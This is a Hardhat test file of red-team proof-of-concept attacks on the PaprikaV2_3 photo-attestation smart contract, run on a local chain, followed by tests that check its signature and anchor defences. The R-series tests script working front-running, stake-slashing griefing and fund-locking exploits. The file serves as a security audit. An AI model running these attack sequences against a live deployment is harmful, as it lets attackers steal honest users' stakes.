// Red-team PoCs against PaprikaV2_3 (spec/PROTOCOL.md v2.3). Local in-process Hardhat chain (osaka, P-256 at 0x100).
const assert = require("assert");
const crypto = require("crypto");
const { ethers, network } = require("hardhat");

const E = (x) => ethers.parseEther(String(x));
const F = (x) => ethers.formatEther(x);
const h = (s) => ethers.sha256(ethers.toUtf8Bytes(s));
const N = 0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551n;
const HALF_N = N / 2n;
const mine = (n) => network.provider.send("hardhat_mine", ["0x" + n.toString(16)]);
const warp = async (sec) => { await network.provider.send("evm_increaseTime", [sec]); await mine(1); };
const automine = (on) => network.provider.send("evm_setAutomine", [on]);
const balOf = (a) => ethers.provider.getBalance(a);
const out = (id, verdict, nums) => console.log(`      POC ${id}: ${verdict} | ${nums}`);
async function reverts(pr, reason) {
  try { await (await pr).wait(); } catch (e) { if (reason) assert(String(e.message).includes(reason), `expected "${reason}", got: ${String(e.message).slice(0, 300)}`); return true; }
  throw new Error("expected revert: " + reason);
}

function newDevice() {
  const { privateKey, publicKey } = crypto.generateKeyPairSync("ec", { namedCurve: "P-256" });
  const jwk = publicKey.export({ format: "jwk" });
  const x = "0x" + Buffer.from(jwk.x, "base64url").toString("hex"), y = "0x" + Buffer.from(jwk.y, "base64url").toString("hex");
  const raw = (pre) => "0x" + crypto.sign("sha256", ethers.getBytes(pre), { key: privateKey, dsaEncoding: "ieee-p1363" }).toString("hex");
  const sign = (pre) => { const sg = raw(pre); const s = BigInt("0x" + sg.slice(66)); return s > HALF_N ? sg.slice(0, 66) + (N - s).toString(16).padStart(64, "0") : sg; };
  return { x, y, keyId: ethers.sha256(ethers.concat([x, y])), sign, raw };
}
const msgReg = (c, k, o) => ethers.solidityPacked(["string", "uint256", "address", "bytes32", "address"], ["PAPRIKA/REGISTER", c.chainId, c.addr, k, o]);
const msgCap = (c, k, H, bh) => ethers.solidityPacked(["string", "uint256", "address", "bytes32", "bytes32", "bytes32"], ["PAPRIKA/CAPTURE", c.chainId, c.addr, k, H, bh]);
const msgExt = (c, k, who) => ethers.solidityPacked(["string", "uint256", "address", "bytes32", "address"], ["PAPRIKA/EXTRACTED", c.chainId, c.addr, k, who]);
const cmOf = (who, H, k, ev, salt) => ethers.keccak256(ethers.AbiCoder.defaultAbiCoder().encode(["address", "bytes32", "bytes32", "bytes32", "bytes32"], [who, H, k, ev, salt]));

async function deploy(oracleName = "MockOptimisticOracleV3Burn") {
  const s = await ethers.getSigners();
  const oracle = await (await ethers.getContractFactory(oracleName, s[0])).deploy();
  const pap = await (await ethers.getContractFactory("PaprikaV2_3", s[0])).deploy(await oracle.getAddress());
  const c = { s, oracle, pap, addr: await pap.getAddress(), chainId: (await ethers.provider.getNetwork()).chainId, keys: [] };
  c.STAKE = await pap.MIN_STAKE(); c.BOND = await pap.CLAIM_BOND(); c.W = Number(await pap.REVEAL_WINDOW());
  return c;
}
async function register(c, owner, dev = newDevice()) {
  await (await c.pap.connect(owner).register(dev.x, dev.y, dev.sign(msgReg(c, dev.keyId, owner.address)), { value: c.STAKE })).wait();
  c.keys.push(dev.keyId); return dev;
}
async function anchor(n) { const b = n === undefined ? await ethers.provider.getBlock("latest") : await ethers.provider.getBlock(n); return { n: b.number, hash: b.hash }; }
const capSig = (c, dev, H, a) => dev.sign(msgCap(c, dev.keyId, H, a.hash));
async function attestWith(c, relayer, dev, H, a, sig) { return (await c.pap.connect(relayer).attest(H, a.n, dev.keyId, sig || capSig(c, dev, H, a))).wait(); }
async function solvency(c) {
  let stakes = 0n; for (const k of c.keys) stakes += (await c.pap.device(k)).stake;
  let credits = 0n; for (const a of c.s) credits += await c.pap.credit(a.address);
  const bal = await balOf(c.addr), cb = await c.pap.commitBondsHeld(), inbox = await c.pap.inbox();
  return { bal, owed: stakes + credits + cb + inbox };
}

describe("Red team PaprikaV2_3", function () {
  let c, s;
  beforeEach(async () => { c = await deploy(); s = c.s; });

  it("R-01a relayer withholds an attestation, records the photo first, then slashes the honest device by prior existence", async () => {
    const honestOwner = s[1], relayer = s[2], relayerSybil = s[3];
    const honest = await register(c, honestOwner);
    const evil = await register(c, relayerSybil);              // relayer's own key, registered under another account
    const H = h("genuine photo taken by the honest camera");
    // 1. the device does everything right: anchor fetched before capture, signature handed to a relayer
    const a0 = await anchor();
    const sig0 = capSig(c, honest, H, a0);
    // 2. the relayer does not submit; it records the same digest under its own key (anchor = a0 or later)
    await attestWith(c, relayer, evil, H, await anchor());
    const evilRec = await c.pap.records(H, evil.keyId);
    // 3. it sits on the honest signature until blockhash(a0) is gone
    await mine(257);
    await reverts(c.pap.connect(honestOwner).attest(H, a0.n, honest.keyId, sig0), "anchor");
    // 4. the camera re-signs with a fresh anchor (the only thing it can do) and submits itself
    await attestWith(c, honestOwner, honest, H, await anchor());
    // 5. the relayer proves "prior existence" against the honest record
    const r0 = await balOf(relayer.address);
    const tx = await (await c.pap.connect(relayer).provePriorExistence(H, honest.keyId, evil.keyId)).wait();
    await mine(c.W + 1);
    const tx2 = await (await c.pap.connect(relayer).settleStake(honest.keyId)).wait();
    const tx3 = await (await c.pap.connect(relayer).claimCredit()).wait();
    const gas = tx.gasUsed * tx.gasPrice + tx2.gasUsed * tx2.gasPrice + tx3.gasUsed * tx3.gasPrice;
    const got = (await balOf(relayer.address)) - r0;
    const vH = await c.pap.verify(H, honest.keyId), vE = await c.pap.verify(H, evil.keyId);
    assert.equal(vH.status, 2n); assert.equal(vH.flagReason, 2n); assert.equal(vH.verdict, 1n);
    assert.equal(vE.status, 1n); assert.equal(vE.verdict, 0n);
    assert(got > 0n);
    out("R-01a", "EXPLOITED", `evil record at block ${evilRec.recordedBlock}; honest stake ${F(c.STAKE)} slashed (PriorExistence); relayer net +${F(got)} ETH after ${F(gas)} gas; relayer's own key still Active, record verdict None`);
  });

  it("R-01b camera that captures offline and anchors at upload is slashed by whoever saw the photo first", async () => {
    const honestOwner = s[1], viewer = s[4];
    const honest = await register(c, honestOwner), evil = await register(c, viewer);
    const H = h("photo shared in a chat before the camera got online");
    await attestWith(c, viewer, evil, H, await anchor());      // the viewer records the bytes it received
    await mine(5);
    await attestWith(c, honestOwner, honest, H, await anchor()); // camera online: anchor = latest block, as in the authors' own helper
    await (await c.pap.connect(viewer).provePriorExistence(H, honest.keyId, evil.keyId)).wait();
    await mine(c.W + 1); await (await c.pap.settleStake(honest.keyId)).wait();
    const cr = await c.pap.credit(viewer.address);
    assert.equal(cr, c.STAKE / 2n);
    out("R-01b", "EXPLOITED", `viewer credit ${F(cr)} ETH from the honest device; ${F(c.STAKE - cr)} ETH burned; no vote, no appeal`);
  });

  it("R-02a prior-existence proof is not bound to the prover: a copier in the same block takes the reward", async () => {
    const forger = s[1], orig = s[2], finder = s[5], bot = s[6];
    const o = await register(c, orig), f = await register(c, forger);
    const H = h("press photo");
    await attestWith(c, orig, o, H, await anchor());
    await mine(300);
    await attestWith(c, forger, f, H, await anchor());         // forger re-attests the press photo as its own capture
    await automine(false);
    const t1 = await c.pap.connect(finder).provePriorExistence(H, f.keyId, o.keyId, { gasPrice: 2_000_000_000n, gasLimit: 400_000n });
    const t2 = await c.pap.connect(bot).provePriorExistence(H, f.keyId, o.keyId, { gasPrice: 3_000_000_000n, gasLimit: 400_000n });
    await mine(1); await automine(true);
    const r1 = await ethers.provider.getTransactionReceipt(t1.hash), r2 = await ethers.provider.getTransactionReceipt(t2.hash);
    await mine(c.W + 1); await (await c.pap.settleStake(f.keyId)).wait();
    const cb = await c.pap.credit(bot.address), cf = await c.pap.credit(finder.address);
    assert.equal(cb, c.STAKE / 2n); assert.equal(cf, 0n);
    out("R-02a", "EXPLOITED", `finder tx status ${r1.status} (reverted "has verdict"), copier tx status ${r2.status}; copier credit ${F(cb)} ETH, finder ${F(cf)} ETH`);
  });

  it("R-02b the forger (holds its own key at level 0) front-runs a pending prior-existence proof with a misuse proof from a sybil", async () => {
    const forger = s[1], forgerSybil = s[7], orig = s[2], finder = s[5];
    const o = await register(c, orig), f = await register(c, forger);
    const H = h("press photo 2");
    await attestWith(c, orig, o, H, await anchor()); await mine(300);
    await attestWith(c, forger, f, H, await anchor());
    await automine(false);
    await c.pap.connect(finder).provePriorExistence(H, f.keyId, o.keyId, { gasPrice: 2_000_000_000n, gasLimit: 400_000n });
    await c.pap.connect(forgerSybil).proveKeyMisuse(f.keyId, f.sign(msgExt(c, f.keyId, forgerSybil.address)), { gasPrice: 3_000_000_000n, gasLimit: 400_000n });
    await mine(1); await automine(true);
    await mine(c.W + 1); await (await c.pap.settleStake(f.keyId)).wait();
    const cs = await c.pap.credit(forgerSybil.address), cf = await c.pap.credit(finder.address);
    assert.equal(cs, c.STAKE / 2n); assert.equal(cf, 0n);
    out("R-02b", "EXPLOITED", `finder's proof included (flag + verdict) but finder credit ${F(cf)}; forger's sybil credit ${F(cs)} ETH: forger's loss capped at ${F(c.STAKE - cs)} ETH and the finder is paid nothing`);
  });

  it("R-03 forger evades prior existence by copying a recorded photo within 256 blocks, with an anchor older than the original record", async () => {
    const orig = s[2], forger = s[1];
    const o = await register(c, orig), f = await register(c, forger);
    const H = h("press photo 3");
    const aOld = await anchor();                              // any block up to 256 back
    await mine(10);
    await attestWith(c, orig, o, H, await anchor());
    const oRec = await c.pap.records(H, o.keyId);
    await mine(200);                                          // 200 blocks later the forger copies it
    await attestWith(c, forger, f, H, aOld);
    const fRec = await c.pap.records(H, f.keyId);
    await reverts(c.pap.connect(s[5]).provePriorExistence(H, f.keyId, o.keyId), "not prior");
    await reverts(c.pap.connect(s[5]).provePriorExistence(H, o.keyId, f.keyId), "not prior");
    out("R-03", "CONFIRMED", `original recorded at ${oRec.recordedBlock}; copy recorded at ${fRec.recordedBlock} with anchor ${fRec.anchorBlock} < original: no objective proof either way; copy window = 256 blocks`);
  });

  it("R-04 an upheld claim whose claimant refuses ETH can never settle: stake and the misuse prover's reward are locked forever (push-payment oracle)", async () => {
    const owner = s[1], prover = s[5];
    const d = await register(c, owner);
    const H = h("forged");
    await attestWith(c, owner, d, H, await anchor());
    const rcl = await (await ethers.getContractFactory("RevertingClaimant")).deploy(c.addr);
    const ev = h("ev"), salt = ethers.hexlify(ethers.randomBytes(32));
    await (await rcl.commit(cmOf(await rcl.getAddress(), H, d.keyId, ev, salt), { value: c.BOND })).wait();
    await mine(1);
    await (await c.pap.connect(prover).proveKeyMisuse(d.keyId, d.sign(msgExt(c, d.keyId, prover.address)))).wait();
    const rx = await (await rcl.reveal(H, d.keyId, ev, salt)).wait();
    const id = (await c.pap.openClaimIds(d.keyId))[0];
    await (await c.oracle.resolveDispute(id, true)).wait();
    await reverts(c.oracle.settleAssertion(id), "pay");
    await mine(c.W + 5);
    await reverts(c.pap.settleStake(d.keyId), "not settleable");
    await warp(31 * 86400);
    await reverts(c.pap.connect(owner).withdraw(d.keyId), "not retired");
    const dv = await c.pap.device(d.keyId);
    out("R-04", "CONFIRMED (mock push payment / blacklistable token)", `settleAssertion reverts; device stake ${F(dv.stake)} + reserved ${F(dv.reserved)} ETH stuck; prover credit ${F(await c.pap.credit(prover.address))}`);
  });

  it("R-05 against an oracle with the real OOv3 bond interface (not payable, ERC-20 bond) every reveal reverts: the claim path is dead", async () => {
    const c2 = await deploy("NonPayableOOv3");
    const d = await register(c2, s[1]);
    const H = h("p");
    await attestWith(c2, s[1], d, H, await anchor());
    const ev = h("e"), salt = ethers.ZeroHash;
    await (await c2.pap.connect(s[3]).commitClaim(cmOf(s[3].address, H, d.keyId, ev, salt), { value: c2.BOND })).wait();
    await mine(1);
    await reverts(c2.pap.connect(s[3]).revealClaim(H, d.keyId, ev, salt));
    await mine(c2.W + 1);
    await (await c2.pap.forfeitCommit(s[3].address, cmOf(s[3].address, H, d.keyId, ev, salt))).wait();
    out("R-05", "CONFIRMED", `revealClaim reverts (value sent to a non-payable assertTruth); the claimant's ${F(c2.BOND)} ETH bond is then burnable by anyone via forfeitCommit`);
  });

  it("R-06 verify().stakeAtRisk includes bonds already handed to the oracle", async () => {
    const d = await register(c, s[1]);
    const H1 = h("a"), H2 = h("b");
    await attestWith(c, s[1], d, H1, await anchor()); await attestWith(c, s[1], d, H2, await anchor());
    for (const H of [H1, H2]) {
      const salt = ethers.hexlify(ethers.randomBytes(32));
      await (await c.pap.connect(s[8]).commitClaim(cmOf(s[8].address, H, d.keyId, h("w"), salt), { value: c.BOND })).wait();
      await mine(1); await (await c.pap.connect(s[8]).revealClaim(H, d.keyId, h("w"), salt)).wait();
    }
    const v = await c.pap.verify(H1, d.keyId);
    out("R-06", "CONFIRMED", `stakeAtRisk ${F(v.stakeAtRisk)} ETH but free stake a new challenger can win is ${F(v.stake)} ETH; a third claim is refused ("stake < bond")`);
  });

  // ------------------------------------------------------------------ what holds
  it("H-1 signature edge cases are rejected (high s, s=0, r=0, r>=n, s=n/2+1, wrong length, (0,0) key, off-curve key, cross-domain replay)", async () => {
    const owner = s[1], dev = newDevice();
    const m = msgReg(c, dev.keyId, owner.address);
    let sig = dev.sign(m); const r = sig.slice(0, 66), sv = BigInt("0x" + sig.slice(66));
    const hex = (v) => v.toString(16).padStart(64, "0");
    const bad = {
      highS: r + hex(N - sv), s0: r + hex(0n), r0: "0x" + hex(0n) + sig.slice(66), rN: "0x" + hex(N) + sig.slice(66),
      rNplus1: "0x" + hex(N + 1n) + sig.slice(66), sN: r + hex(N), len65: sig + "00", len63: sig.slice(0, -2),
    };
    for (const [k, v] of Object.entries(bad)) await reverts(c.pap.connect(owner).register(dev.x, dev.y, v, { value: c.STAKE }), "bad pop");
    await reverts(c.pap.connect(owner).register(ethers.ZeroHash, ethers.ZeroHash, sig, { value: c.STAKE }), "bad pop");
    await reverts(c.pap.connect(owner).register(dev.x, ethers.toBeHex(BigInt(dev.y) ^ 1n, 32), sig, { value: c.STAKE }), "bad pop");
    // s exactly n/2 is accepted by the contract's range check (HALF_N = floor(n/2)); its mirror n - HALF_N = HALF_N + 1 is not
    assert.equal(await c.pap.MIN_STAKE(), c.STAKE);
    await (await c.pap.connect(owner).register(dev.x, dev.y, sig, { value: c.STAKE })).wait();
    c.keys.push(dev.keyId);
    // a REGISTER signature is not a misuse proof, a CAPTURE signature is not either
    await reverts(c.pap.connect(owner).proveKeyMisuse(dev.keyId, sig), "bad sig");
    const a = await anchor(); const cs = capSig(c, dev, h("x"), a);
    await reverts(c.pap.connect(s[2]).proveKeyMisuse(dev.keyId, cs), "bad sig");
    // a misuse proof for one challenger is useless to another
    await reverts(c.pap.connect(s[3]).proveKeyMisuse(dev.keyId, dev.sign(msgExt(c, dev.keyId, s[2].address))), "bad sig");
    out("H-1", "HOLDS", `${Object.keys(bad).length + 2} malformed signatures/keys rejected; cross-domain and cross-challenger replay rejected`);
  });

  it("H-2 anchor edge cases: current block, future block, 256 back accepted, 257 back rejected", async () => {
    const d = await register(c, s[1]);
    const bn = await ethers.provider.getBlockNumber();
    // anchor = the block the tx lands in (bn+1) and a future block: blockhash = 0
    await reverts(c.pap.attest(h("c"), bn + 1, d.keyId, capSig(c, d, h("c"), { hash: ethers.ZeroHash })), "anchor");
    await reverts(c.pap.attest(h("c"), bn + 1000, d.keyId, capSig(c, d, h("c"), { hash: ethers.ZeroHash })), "anchor");
    await reverts(c.pap.attest(h("c"), 2n ** 64n + BigInt(bn), d.keyId, "0x" + "00".repeat(64)), "anchor");
    const a = await anchor(); await mine(255);                  // tx lands at a.n + 256
    await attestWith(c, s[2], d, h("ok256"), a);
    const b = await anchor(); await mine(256);                  // tx lands at b.n + 257
    await reverts(c.pap.attest(h("x257"), b.n, d.keyId, capSig(c, d, h("x257"), b)), "anchor");
    out("H-2", "HOLDS", "blockhash window enforced; anchorBlock above 2^64 cannot be truncated into a valid one");
  });

  it("H-3 oracle boundary: callbacks from non-oracle, double callback, forced ETH; balance still covers obligations", async () => {
    const d = await register(c, s[1]); const H = h("q");
    await attestWith(c, s[1], d, H, await anchor());
    await reverts(c.pap.connect(s[9]).assertionResolvedCallback(ethers.ZeroHash, true), "only oracle");
    await reverts(s[9].sendTransaction({ to: c.addr, value: 1n }), "only oracle");
    const salt = ethers.hexlify(ethers.randomBytes(32));
    await (await c.pap.connect(s[3]).commitClaim(cmOf(s[3].address, H, d.keyId, h("e"), salt), { value: c.BOND })).wait();
    await mine(1); await (await c.pap.connect(s[3]).revealClaim(H, d.keyId, h("e"), salt)).wait();
    await reverts(c.pap.connect(s[3]).revealClaim(H, d.keyId, h("e"), salt), "no commit");
    const id = (await c.pap.openClaimIds(d.keyId))[0];
    await (await c.oracle.resolveDispute(id, false)).wait(); await (await c.oracle.settleAssertion(id)).wait();
    await reverts(c.oracle.settleAssertion(id), "not settleable");
    await (await ethers.getContractFactory("ForceSend")).deploy(c.addr, { value: E(1) });
    const sv = await solvency(c);
    assert(sv.bal >= sv.owed);
    assert.equal((await c.pap.device(d.keyId)).stake, c.STAKE + c.BOND / 2n);
    out("H-3", "HOLDS", `balance ${F(sv.bal)} >= obligations ${F(sv.owed)} (forced 1 ETH is simply stranded; no equality check)`);
  });

  it("H-4 a griefer cannot flag an honest device whose anchor predates the photo becoming public", async () => {
    const honest = await register(c, s[1]), evil = await register(c, s[4]);
    const H = h("fresh capture"); const a = await anchor();     // anchor fetched before capture
    await mine(3);
    // the photo leaks right after capture; the griefer records it immediately
    await attestWith(c, s[4], evil, H, await anchor());
    await attestWith(c, s[1], honest, H, a, capSig(c, honest, H, a));
    await reverts(c.pap.provePriorExistence(H, honest.keyId, evil.keyId), "not prior");
    out("H-4", "HOLDS", "only post-capture (or re-signed) anchors are exposed, see R-01");
  });
});
